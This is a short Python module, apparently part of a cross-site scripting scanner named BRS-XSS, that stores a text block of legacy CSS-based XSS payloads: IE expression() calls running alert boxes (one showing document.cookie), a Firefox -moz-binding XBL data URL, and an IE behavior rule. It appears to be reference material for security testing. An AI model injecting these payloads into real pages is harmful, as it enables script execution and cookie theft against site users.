#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

CSS Context - Legacy Attack Vectors
"""

LEGACY_ATTACKS = """
LEGACY ATTACK VECTORS (Still work in old browsers):

1. IE EXPRESSION():
   <style>div {background: expression(alert(1))}</style>
   <style>div {width: expression(alert(document.cookie))}</style>
   
   Affects: IE 5-7
   Executes JavaScript in CSS

2. -MOZ-BINDING (Firefox):
   <style>
   div {-moz-binding: url("data:text/xml,<?xml version='1.0'?><bindings xmlns='http://www.mozilla.org/xbl'><binding id='x'><implementation><constructor>alert(1)</constructor></implementation></binding></bindings>");}
   </style>
   
   Affects: Firefox < 4

3. BEHAVIOR (IE):
   <style>
   div {behavior: url(xss.htc);}
   </style>
   
   Affects: IE 5-9
"""

